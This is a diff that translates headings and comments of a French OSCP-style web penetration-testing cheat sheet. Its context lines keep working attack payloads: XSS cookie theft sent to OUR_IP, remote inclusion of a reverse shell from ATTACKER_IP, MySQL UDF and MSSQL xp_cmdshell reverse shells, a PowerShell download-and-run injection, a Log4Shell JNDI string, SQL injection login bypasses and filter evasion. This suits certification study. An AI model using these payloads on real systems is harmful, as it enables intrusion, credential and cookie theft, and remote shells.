@@ -25,7 +25,7 @@ nikto -ask=no -h http://$IP 2>&1
 
 # Lorsque vous trouvez un site Web HTTP, essayez toujours de faire un post sur les requêtes que vous trouvez pour voir ce qui se passe
 
-# Obtain SSL certificate information
+# Afficher les informations du certificat TLS/SSL
 openssl s_client -connect <target_domain>:443
 
 ```
@@ -104,7 +104,7 @@ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
 <p class="oscp-command-note">Rechercher des répertoires web avec DIRB.</p>
 
 ```bash
-# Scan élémentaire des répertoires
+# Scan simple des répertoires
 dirb http://target /path/to/wordlist.txt
 
 # Enregistrer la sortie dans un fichier
@@ -119,7 +119,7 @@ dirb http://target /path/to/wordlist.txt -N
 # Analysez SSL (HTTPS)
 dirb https://target /path/to/wordlist.txt
 
-# Recursively scan directories
+# Rechercher les répertoires récursivement
 dirb http://target /path/to/wordlist.txt -r
 
 # Exclude specific status codes
@@ -137,7 +137,7 @@ dirb http://target.com
 <p class="oscp-command-note">Énumérer les répertoires ou sous-domaines avec Gobuster.</p>
 
 ```bash
-# Scan élémentaire des répertoires
+# Scan simple des répertoires
 gobuster dir -u http://target -w /path/to/wordlist.txt
 
 # Filtre pour afficher seulement 200 réponses
@@ -187,7 +187,7 @@ feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list
 <p class="oscp-command-note">Rechercher des chemins web avec dirsearch.</p>
 
 ```bash
-# Scan élémentaire des répertoires
+# Scan simple des répertoires
 dirsearch -u http://target -w /path/to/wordlist.txt
 
 # Filtre pour afficher seulement 200 ou 3xx réponses
@@ -396,7 +396,7 @@ dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
 <p class="oscp-command-note">Script shell dans la rubrique « Dépôt Git exposé ».</p>
 
 ```bash
-# Domptez le contenu d'un répertoire .git exposé
+# Extraire le contenu d’un répertoire .git exposé
 git-dumper http://[IP/Domain]/.git website_git
 
 # Rechercher des secrets communs dans les fichiers sous-évalués
@@ -439,7 +439,7 @@ git reset --hard
 ```
 
 
-### CMS
+### Systèmes de gestion de contenu (CMS)
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -447,7 +447,7 @@ Examiner les entrées et les réponses de l'application web.
 <p class="oscp-command-note">Examiner un site WordPress.</p>
 
 ```bash
-# Scan WordPress de base
+# Effectuer un scan simple de WordPress
 wpscan --url http://$IP/wp/
 
 ```
@@ -555,7 +555,7 @@ wpscan --url http(s)://<IP>/ --enumerate p --plugins-detection aggressive
 ```
 
 
-### WebDav
+### WebDAV
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -607,7 +607,7 @@ nc -nvlp 80
 
 
 <p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://$VictimIP/shell.aspx</code></p>
-### APIs
+### Interfaces de programmation (API)
 
 
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
@@ -619,10 +619,10 @@ curl http://$IP/api/
 # Exemple de sortie
 [{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 
 
-# Common API Pattern
+# Exemple de chemin d’API
 /api_name/v1
 
-# Explore specific endpoints
+# Interroger des points d’accès (endpoints) précis
 curl http://$IP/api/user/ 
 
 http://[IP]:[PORT]/search
@@ -637,7 +637,7 @@ curl -X GET "http://[IP]:[PORT]/search?query=lol"
 # Utiliser -d pour les données et -H pour les en-têtes
 curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://[IP]:[PORT]/users/v1/login
 
-# Option to send request to proxy as well
+# Passer aussi la requête par un proxy
 --proxy 127.0.0.1:8080
 
 ```
@@ -661,9 +661,9 @@ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/j
 # Obtenir le contenu du site
 curl http://example.com > example.txt
 
-# Remove duplicated entries
+# Supprimer les entrées en double
 
-# Crate the dictionary
+# Créer le dictionnaire de mots
 html2dic example.txt
 # Autre possibilité
 cewl -w createWordlist.txt https://www.example.com
@@ -674,12 +674,12 @@ john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
 ```
 
 
-## XSS
+## Injection de scripts intersites (XSS / Cross-Site Scripting)
 
 Examiner les entrées et les réponses de l'application web.
 
 
-### Theory
+### Principe
 
 
 
@@ -690,16 +690,16 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-**Stored (Persistent)**
+**XSS stockée (Stored / persistante)**
 
 
-**Reflected (Non-Persistent)**
+**XSS réfléchie (Reflected / non persistante)**
 
 
-**DOM-Based**
+**XSS fondée sur le DOM (DOM-Based)**
 
 
-### Stored
+### XSS stockée (Stored XSS)
 
 
 <p class="oscp-command-note">Extrait HTML lié à « Stored ».</p>
@@ -715,7 +715,7 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-### Reflected
+### XSS réfléchie (Reflected XSS)
 
 
 
@@ -730,7 +730,7 @@ http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/s
 ![Reflected XSS Result](https://www.emmanuelsolis.com/img/xss02.png)
 
 
-### Blind
+### XSS aveugle (Blind XSS)
 
 
 <p class="oscp-command-note">Extrait HTML lié à « Blind ».</p>
@@ -752,21 +752,21 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ### Élévation de privilèges par détournement de session
 
 
-<p class="oscp-command-note">Extrait HTML lié à « PrivEsc Using Session Hijacking ».</p>
+<p class="oscp-command-note">Exemple HTML lié à l’élévation de privilèges par détournement de session.</p>
 
 ```html
-# Possible Payloads
+# Exemples de charges utiles (Payloads)
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 # Autre possibilité
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 
-# Access the Host
+# Accéder à l’hôte cible
 <script src=http://OUR_IP>/script.js</script>
 
 ```
 
 
-<p class="oscp-command-note">Extrait PHP lié à « PrivEsc Using Session Hijacking ».</p>
+<p class="oscp-command-note">Exemple PHP lié à l’élévation de privilèges par détournement de session.</p>
 
 ```php
 # Payload
@@ -788,7 +788,7 @@ if (isset($_GET['c'])) {
 ```
 
 
-### Wordpress HttpOnly Cookie (Visitor Plugin)
+### Cookie HttpOnly dans WordPress (extension Visitor)
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -859,7 +859,7 @@ curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resul
 ```
 
 
-### Automated Découverte
+### Détection automatisée
 
 
 <p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>
@@ -951,7 +951,7 @@ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?langua
 ```
 
 
-#### Bypassing LFI Protections
+#### Contournement des protections LFI
 
 
 <p class="oscp-command-note">Script shell dans la rubrique « Bypassing LFI Protections ».</p>
@@ -986,7 +986,7 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 ```
 
 
-#### LFI Wrappers
+#### Flux d’accès aux fichiers via LFI (Wrappers)
 
 
 <p class="oscp-command-note">Script shell dans la rubrique « LFI Wrappers ».</p>
@@ -1014,7 +1014,7 @@ curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource
 ```
 
 
-##### Log Poisoning (Apache or SSH Logs)
+##### Empoisonnement des journaux Apache ou SSH (Log Poisoning)
 
 
 **Paramètres et repères :**
@@ -1083,7 +1083,7 @@ smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
 ```
 
 
-#### Reverse Shell via LFI
+#### Shell inversé via LFI (Reverse Shell)
 
 
 **Paramètres et repères :**
@@ -1177,7 +1177,7 @@ curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
 ```
 
 
-### WordPress Plugin for Reverse Shell
+### Extension WordPress pour obtenir un shell inversé
 
 
 
@@ -1187,7 +1187,7 @@ curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
 `multi-os-php-reverse-shell.php`  
 
 
-#### PHP Webshell
+#### Webshell PHP
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -1200,7 +1200,7 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-#### ASP Webshell
+#### Webshell ASP
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -1213,7 +1213,7 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-#### Non-Meterpreter Payload for Netcat
+#### Charge utile Netcat sans Meterpreter
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -1360,7 +1360,7 @@ C:\xampp\tomcat\conf\server.xml
 ```
 
 
-### PHP Wrappers
+### Flux PHP (PHP Wrappers)
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -1395,7 +1395,7 @@ echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
 ```
 
 
-### OS Command Injection
+### Injection de commandes système (OS Command Injection)
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -1424,7 +1424,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-## Téléchargement de fichier
+## Téléversement de fichiers (File Upload)
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -1433,7 +1433,7 @@ Examiner les entrées et les réponses de l'application web.
 `.php` · `.aspx`  
 
 
-### Extensions Blacklist
+### Extensions interdites (liste de blocage)
 
 
 **Paramètres et repères :**
@@ -1470,7 +1470,7 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-### Extensions Whitelist
+### Extensions autorisées (liste d’autorisation)
 
 
 <p class="oscp-command-note">Script shell dans la rubrique « Extensions Whitelist ».</p>
@@ -1487,7 +1487,7 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 ```
 
 
-### Bypassing Filters
+### Contournement des filtres
 
 
 
@@ -1617,7 +1617,7 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 ![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)
 
 
-### Exécution de fichier
+### Exécution de fichiers téléversés
 
 
 
@@ -1630,7 +1630,7 @@ http://[TARGET_IP]/uploads/shell.php?cmd=whoami
 ```
 
 
-### Embed Code into Images
+### Insérer du code dans les images
 
 
 **Paramètres et repères :**
@@ -1647,7 +1647,7 @@ mv lo.jpg lo.php.jpg
 ```
 
 
-### Embed Code into File Names
+### Insérer du code dans les noms de fichiers
 
 
 
@@ -1679,12 +1679,12 @@ cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.
 ```
 
 
-## Attaques SQL
+## Injection SQL (SQLi)
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-#### MySQL for MySQL (Linux)
+#### Client MySQL sous Linux
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
@@ -1729,7 +1729,7 @@ USE <database_name>;
 ```
 
 
-##### Enumerating Tables and Columns
+##### Énumération des tables et colonnes
 
 
 <p class="oscp-command-note">Instruction SQL dans la rubrique « Enumerating Tables and Columns ».</p>
@@ -1746,7 +1746,7 @@ SHOW COLUMNS FROM <table_name>;
 ```
 
 
-##### Énumération des utilisateurs and Privileges
+##### Énumération des utilisateurs et privilèges
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -1776,7 +1776,7 @@ SELECT * FROM <table_name> LIMIT <number_of_rows>;
 ```
 
 
-##### Exécution de commandes via User-Defined Functions (UDFs)
+##### Exécution de commandes via les fonctions définies par l’utilisateur (UDF)
 
 
 <p class="oscp-command-note">Interroger une base de données MySQL.</p>
@@ -1803,7 +1803,7 @@ SELECT sys_exec('id');
 ```
 
 
-##### Reverse Shell
+##### Shell inversé (Reverse Shell)
 
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
@@ -1822,7 +1822,7 @@ SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
 ```
 
 
-##### Where to Get Your .so for UDF
+##### Obtenir une bibliothèque .so pour une UDF
 
 
 **Paramètres et repères :**
@@ -1937,7 +1937,7 @@ SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
 ```
 
 
-#### Mssqlclient for MSSQL (Windows)
+#### Client MSSQL avec mssqlclient sous Windows
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
@@ -1979,7 +1979,7 @@ USE <database_name>;
 ```
 
 
-##### Enumerating Tables and Columns
+##### Énumération des tables et colonnes
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -1997,7 +1997,7 @@ SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '
 ```
 
 
-##### Énumération des utilisateurs and Privileges
+##### Énumération des utilisateurs et privilèges
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -2071,7 +2071,7 @@ EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClie
 ```
 
 
-#### Tips
+#### Conseils
 
 
 **Paramètres et repères :**
@@ -2123,7 +2123,7 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 ```
 
 
-#### Error-Based Payloads
+#### Charges utiles fondées sur les erreurs (Error-Based)
 
 
 
@@ -2158,7 +2158,7 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 ```
 
 
-#### UNION-Based Payloads
+#### Charges utiles fondées sur UNION (UNION-Based)
 
 
 **Paramètres et repères :**
@@ -2400,7 +2400,7 @@ http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a
 ```
 
 
-##### Extracting Table and Column Names
+##### Extraire les noms des tables et colonnes
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -2425,7 +2425,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.colum
 ```
 
 
-##### Extracting Data
+##### Extraire les données
 
 
 **Paramètres et repères :**
@@ -2453,7 +2453,7 @@ admin' AND SUBSTRING(username,1,1)='a' --+   # MSSQL
 ```
 
 
-##### Boolean-Based
+##### Injection aveugle booléenne (Boolean-Based)
 
 
 **Paramètres et repères :**
@@ -2472,7 +2472,7 @@ http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_len
 ```
 
 
-##### Time-Based
+##### Injection aveugle temporelle (Time-Based)
 
 
 <p class="oscp-command-note">Instruction SQL dans la rubrique « Time-Based ».</p>
@@ -2595,7 +2595,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 ![Blind SQL Injection with Tools](https://www.emmanuelsolis.com/img/automating_blind_sqli.gif)
 
 
-#### Login Bypass Commandes
+#### Commandes de contournement d’authentification
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -2651,7 +2651,7 @@ meh' OR 1=1;--
 ```
 
 
-#### Vulnerable Code Example
+#### Exemple de code vulnérable
 
 
 <p class="oscp-command-note">Extrait PHP lié à « Vulnerable Code Example ».</p>
@@ -2675,7 +2675,7 @@ if($row) {
 ```
 
 
-### SQL Truncation
+### Troncation SQL (SQL Truncation)
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
@@ -2708,7 +2708,7 @@ username=admin++++++++&password=testpwn123
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-##### Default Databases
+##### Bases de données par défaut
 
 
 **Paramètres et repères :**
@@ -2850,7 +2850,7 @@ EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [ka
 ```
 
 
-##### Impersonation
+##### Usurpation de contexte (Impersonation)
 
 
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
@@ -2906,7 +2906,7 @@ RECONFIGURE;
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-##### Default Databases
+##### Bases de données par défaut
 
 
 **Paramètres et repères :**
@@ -3084,7 +3084,7 @@ admin ' OR 1=1 --
 ```
 
 
-##### Login Bypass
+##### Contournement de l’authentification (Login Bypass)
 
 
 <p class="oscp-command-note">Instruction SQL dans la rubrique « Login Bypass ».</p>
@@ -3095,7 +3095,7 @@ admin ' OR 1=1 --
 ```
 
 
-##### Union-Based Injection (Dump Creds)
+##### Injection par UNION pour extraire les identifiants
 
 Examiner les entrées et les réponses de l'application web.
 
@@ -3105,10 +3105,10 @@ Examiner les entrées et les réponses de l'application web.
 Examiner les entrées et les réponses de l'application web.
 
 
-### Identifying
+### Détection
 
 
-**Tag**
+**Balise XML (Tag)**
 
 
 
@@ -3119,7 +3119,7 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-**Entity**
+**Entité XML (Entity)**
 
 
 
@@ -3130,7 +3130,7 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-**Element**
+**Élément XML (Element)**
 
 
 
@@ -3141,7 +3141,7 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
-**Attribute**
+**Attribut XML (Attribute)**
 
 
 
@@ -3152,7 +3152,7 @@ version="1.0"/encoding="UTF-8"
 ```
 
 
-**Declaration**
+**Déclaration XML (Declaration)**
 
 
 
@@ -3163,7 +3163,7 @@ version="1.0"/encoding="UTF-8"
 ```
 
 
-### Local File Disclosure
+### Lecture de fichiers locaux
 
 
 
@@ -3178,7 +3178,7 @@ version="1.0"/encoding="UTF-8"
 ![XEE Result](https://www.emmanuelsolis.com/img/xee02.png)
 
 
-### Reading Sensitive Files
+### Lecture de fichiers sensibles
 
 ![XEE Reading Sensitive Files](https://www.emmanuelsolis.com/img/xee03.png)
 
@@ -3242,7 +3242,7 @@ version="1.0"/encoding="UTF-8"
 ```
 
 
-### Reading Code source
+### Lecture du code source
 
 
 
@@ -3309,7 +3309,7 @@ version="1.0"/encoding="UTF-8"
 
 
 ```bash
-# Script avec regex pour trouver les documents
+# Script avec expression régulière (regex) pour trouver les documents
 #!/bin/bash
 
 url="http://SERVER_IP:PORT"
@@ -3338,7 +3338,7 @@ done
 ```
 
 
-### AJAX Calls
+### Requêtes AJAX
 
 
 <p class="oscp-command-note">Extrait JavaScript lié à « AJAX Calls ».</p>
@@ -3360,7 +3360,7 @@ function changeUserPassword() {
 ```
 
 
-### Hashing & Encoding
+### Hachage et encodage
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -3389,7 +3389,7 @@ $.ajax({
 ```
 
 
-### Compare User Roles
+### Comparaison des rôles utilisateurs
 
 
 **Paramètres et repères :**
@@ -3412,7 +3412,7 @@ $.ajax({
 ```
 
 
-### Insecure APIs
+### API insuffisamment sécurisées
 
 
 
@@ -3435,7 +3435,7 @@ $.ajax({
 Examiner les entrées et les réponses de l'application web.
 
 
-### Identifying
+### Détection
 
 
 
@@ -3469,7 +3469,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-### Command Methods
+### Méthodes d’exécution des commandes
 
 
 
@@ -3480,7 +3480,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-**Semicolon**
+**Point-virgule (Semicolon)**
 
 
 
@@ -3494,7 +3494,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 <p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%3b</code></p>
 
 
-**New Line**
+**Nouvelle ligne (New Line)**
 
 
 
@@ -3505,7 +3505,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-**Background**
+**Arrière-plan (Background)**
 
 
 
@@ -3519,7 +3519,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 <p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%26</code></p>
 
 
-**Pipe**
+**Tube de communication (Pipe)**
 
 
 
@@ -3533,7 +3533,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 <p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%7c</code></p>
 
 
-**AND**
+**ET logique (AND)**
 
 
 
@@ -3547,7 +3547,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 <p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%26%26</code></p>
 
 
-**OR**
+**OU logique (OR)**
 
 
 
@@ -3561,7 +3561,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 <p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%7c%7c</code></p>
 
 
-**Sub-Shell**
+**Sous-shell (Subshell)**
 
 
 
@@ -3572,7 +3572,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-**Sub-Shell**
+**Sous-shell (Subshell)**
 
 
 
@@ -3586,7 +3586,7 @@ $()
 <p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%24%28%29</code></p>
 
 
-#### Space is Blacklisted
+#### Contournement du filtrage des espaces
 
 
 
@@ -3603,7 +3603,7 @@ $()
 ```
 
 
-#### / or \ are Blacklisted
+#### Contournement du filtrage de / et \
 
 
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
@@ -3624,7 +3624,7 @@ $env:HOMEPATH[0]
 ```
 
 
-#### Commandes are Blacklisted
+#### Contournement des commandes interdites
 
 
 <p class="oscp-command-note">Extrait JavaScript lié à « Commandes are Blacklisted ».</p>
@@ -3678,7 +3678,7 @@ Example:
 ```
 
 
-#### Reverse Commandes
+#### Commandes inversées
 
 
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
@@ -3705,7 +3705,7 @@ iex "$('imaohw'[-1..-20] -join '')"
 ```
 
 
-#### Encoded Commandes
+#### Commandes encodées
 
 
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
@@ -3731,7 +3731,7 @@ iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64Str
 ```
 
 
-### Automatic Tools
+### Outils automatisés
 
 
 <p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>
@@ -3822,7 +3822,7 @@ ${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}
 ```
 
 
-## Exploiting CVEs
+## Exploitation de vulnérabilités identifiées par CVE
 
 
 
